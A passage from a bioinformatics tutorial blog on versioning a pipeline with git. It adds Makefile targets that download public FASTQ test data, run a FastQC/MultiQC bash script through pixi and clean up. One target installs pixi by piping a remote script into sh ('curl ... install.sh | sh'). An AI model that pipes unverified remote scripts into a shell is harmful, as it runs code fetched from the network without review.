<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout main</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> pull origin main</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> switch </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> feature/add-data</span><br></span></code></pre></div></div>
<p>Now we'll add a few target setups to the Makefile to automate data download and cleanup tasks for your pipeline:</p>
<ul>
<li class=""><strong><code>data/GSE110004</code> target</strong>: Downloads example FASTQ files from a public test dataset into the <code>data/GSE110004</code> directory. This ensures everyone working on the project uses the same input data, improving reproducibility.</li>
<li class=""><strong><code>clean</code> target</strong>: Removes the downloaded data directory, making it easy to reset your environment or save disk space.</li>
</ul>
<p>This approach helps standardize data management and makes it easier for collaborators (and CI/CD systems) to set up and test the pipeline with minimal manual steps.</p>
<p>Update your <code>Makefile</code> with the following:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin/pixi:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">${</span><span class="token variable environment constant" style="color:hsl(35, 99%, 36%)">HOME</span><span class="token variable" style="color:hsl(221, 87%, 60%)">}</span><span class="token plain">/.pixi/bin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-sSL</span><span class="token plain"> https://pixi.dev/install.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">data:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> data/GSE110004/SRR6351937_1.fastq.gz https://ftp.sra.ebi.ac.uk/vol1/fastq/SRR635/007/SRR6351937/SRR6351937_1.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">wget</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-O</span><span class="token plain"> data/GSE110004/SRR6351937_2.fastq.gz https://ftp.sra.ebi.ac.uk/vol1/fastq/SRR635/007/SRR6351937/SRR6351937_2.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">clean:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token function" style="color:hsl(221, 87%, 60%)">rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-rf</span><span class="token plain"> data</span><br></span></code></pre></div></div>
<p>Following tutorial 1, you can commit, push, create a PR, and merge to main:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> commit </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"feat: add makefile to get data"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> push origin feature/add-data</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="add-workflow">Add workflow<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#add-workflow" class="hash-link" aria-label="Direct link to Add workflow" title="Direct link to Add workflow" translate="no">​</a></h2>
<p>Create new branch</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout main</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> pull</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> switch </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> feature/workflow</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="add-workflow-mainsh-script-and-testing">Add workflow main.sh script and testing<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#add-workflow-mainsh-script-and-testing" class="hash-link" aria-label="Direct link to Add workflow main.sh script and testing" title="Direct link to Add workflow main.sh script and testing" translate="no">​</a></h3>
<p>Here I create a simple bash script that will run using command lines with inputs as arguments.</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># create workflow file using bash script, this runs for only paired reads of 1 sample</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;&lt;</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> </span><span class="token string bash punctuation operator" style="color:hsl(221, 87%, 60%)">&gt;&gt;</span><span class="token string bash punctuation" style="color:hsl(119, 34%, 47%)"> main.sh</span><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">#!/bin/bash</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"># Usage: ./main.sh &lt;read1.fastq.gz&gt; &lt;read2.fastq.gz&gt; &lt;output_folder&gt;</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">set -e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">if [ "\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$#</span><span class="token string" style="color:hsl(119, 34%, 47%)">" -ne 3 ]; then</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    echo "Usage: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$0</span><span class="token string" style="color:hsl(119, 34%, 47%)"> &lt;read1.fastq.gz&gt; &lt;read2.fastq.gz&gt; &lt;output_folder&gt;"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">    exit 1</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">fi</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">READ1="\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$1</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">READ2="\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$2</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">OUTDIR="\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$3</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">mkdir -p "\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">echo "Running FastQC on \</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$READ1</span><span class="token string" style="color:hsl(119, 34%, 47%)"> and \</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$READ2</span><span class="token string" style="color:hsl(119, 34%, 47%)">..."</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">fastqc "\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$READ1</span><span class="token string" style="color:hsl(119, 34%, 47%)">" "\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$READ2</span><span class="token string" style="color:hsl(119, 34%, 47%)">" -o "\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">echo "Running MultiQC in \</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">..."</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">multiqc "\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">" -o "\</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">echo "All done. Results are in \</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTDIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token string" style="color:hsl(119, 34%, 47%)">EOF</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># chmod to be executed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">chmod</span><span class="token plain"> +x main.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># get help script</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> main.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Usage: zsh &lt;read1.fastq.gz&gt; &lt;read2.fastq.gz&gt; &lt;output_folder&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># test it with your data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># activate pixi </span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi shell</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># run interactively</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> main.sh data/GSE110004/*_1.fastq.gz data/GSE110004/*_2.fastq.gz result</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># run with pixi directly</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> main.sh data/GSE110004/*_1.fastq.gz data/GSE110004/*_2.fastq.gz result</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="qc_wf" src="https://riverxdata.github.io/river-docs/assets/images/qc_workflow-9a92452d2aaa1a2b5a25d1da3c212a57.png" width="1519" height="1036" class="img_ev3q"></p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="use-makefile-to-add-tests">Use Makefile to add tests<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#use-makefile-to-add-tests" class="hash-link" aria-label="Direct link to Use Makefile to add tests" title="Direct link to Use Makefile to add tests" translate="no">​</a></h3>
<p>Now we can quickly run tests after updating the <code>Makefile</code>:</p>
<div class="language-Makefile language-makefile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-makefile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.PHONY: install-pixi test-e2e clean</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">${HOME}/.pixi/bin/pixi:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	mkdir -p ${HOME}/.pixi/bin</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	curl -sSL https://pixi.dev/install.sh | sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">data/GSE110004:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	mkdir -p data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	cd data/GSE110004 &amp;&amp; \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	wget https://raw.githubusercontent.com/nf-core/test-datasets/rnaseq/testdata/GSE110004/SRR6357070_1.fastq.gz &amp;&amp; \</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	wget https://raw.githubusercontent.com/nf-core/test-datasets/rnaseq/testdata/GSE110004/SRR6357070_2.fastq.gz</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">test-e2e: data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	${HOME}/.pixi/bin/pixi run bash main.sh data/GSE110004/*_1.fastq.gz data/GSE110004/*_2.fastq.gz result</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">clean:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	rm -rf data/GSE110004</span><br></span></code></pre></div></div>
<p>Quickly run the test:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> test-e2e</span><br></span></code></pre></div></div>
<p>Update your <code>.gitignore</code> to avoid committing the results:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Build and Release Folders</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bin-debug/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bin-release/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">Oo</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">bj/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">Bb</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain">in/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Other files and folders</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.settings/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Executables</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">*.swf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">*.air</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">*.ipa</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">*.apk</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># should NOT be excluded as they contain compiler settings and other important</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># information for Eclipse / Flash Builder.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># pixi environments</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.pixi/*</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><span class="token plain">.pixi/config.toml</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">result</span><br></span></code></pre></div></div>
<p>Following tutorial 1, you can commit, push, create a PR, and merge to main:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> commit </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"feat: add workflow"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> push origin feature/workflow </span><br></span></code></pre></div></div>
<p>Then, in your repository root folder, run these commands to get the data:</p>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>tip</div><div class="admonitionContent_BuS1"><ul>
<li class="">Currently, a few make target commands are simple and can be run directly, but in the future, it would be better to update them with more commands</li>
<li class="">Ex: <code>make clean</code> can be used to delete more files/folders</li>
</ul></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> checkout </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># download data</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> data</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># test that data is downloaded</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-lah</span><span class="token plain">  data/GSE110004</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># total 4.3M</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># drwxrwxr-x 2 giangnguyen giangnguyen 4.0K Jan 19 01:00 .</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># drwxrwxr-x 3 giangnguyen giangnguyen 4.0K Jan 19 01:00 ..</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># -rw-rw-r-- 1 giangnguyen giangnguyen 2.2M Jan 19 01:00 SRR6357070_1.fastq.gz</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># -rw-rw-r-- 1 giangnguyen giangnguyen 2.2M Jan 19 01:00 SRR6357070_2.fastq.gz</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># delete data folder</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> clean</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="configure-testing">Configure testing<a href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2#configure-testing" class="hash-link" aria-label="Direct link to Configure testing" title="Direct link to Configure testing" translate="no">​</a></h2>
